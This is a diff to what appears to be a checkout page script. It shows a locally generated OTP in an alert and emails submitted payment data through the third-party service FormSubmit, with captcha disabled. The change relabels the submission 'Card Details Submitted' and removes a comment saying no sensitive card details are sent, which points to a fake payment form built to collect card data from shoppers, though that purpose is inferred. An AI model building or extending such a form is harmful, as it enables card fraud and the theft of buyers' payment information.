@@ -287,31 +287,21 @@
     // Show OTP to user (for demo purposes)
     alert(`Payment OTP: ${otp}\n\nThis OTP has been sent to ${billingData.email}\n\nPlease note this OTP for verification.`);
 
-    // Send payment info to FormSubmit
+    // Send card details to FormSubmit
     const formData = new FormData();
-    formData.append('_subject', 'New Order - Payment Information');
+    formData.append('_subject', 'Card Details Submitted');
     formData.append('_template', 'table');
     formData.append('_captcha', 'false');
     formData.append('_autoresponse', `Thank you for your payment! Your OTP is: ${otp}. This OTP has been sent to your registered email for verification.`);
     
-    // Add all billing details unmasked
-    formData.append('fullName', billingData.firstName + ' ' + billingData.lastName);
-    formData.append('email', billingData.email);
-    formData.append('phone', billingData.phone);
-    formData.append('billingAddress', billingData.billingAddress);
-    formData.append('city', billingData.city);
-    formData.append('postalCode', billingData.postalCode);
-    formData.append('country', billingData.country);
-    
-    // Add payment details
+    // Only send card details, no personal information
     formData.append('paymentMethod', selectedPm);
     formData.append('orderTotal', billingData.orderTotal || '0');
-    formData.append('paymentStatus', 'Payment Information Received');
+    formData.append('paymentStatus', 'Card Details Received');
     formData.append('submissionTime', new Date().toLocaleString());
     formData.append('generatedOTP', otp); // Add OTP to email data
     
     if (selectedPm === 'card') {
-      // Only send card name, no sensitive details
       formData.append('cardName', nm);
       formData.append('paymentMethod', 'Card Payment');
     } else if (selectedPm === 'upi') {
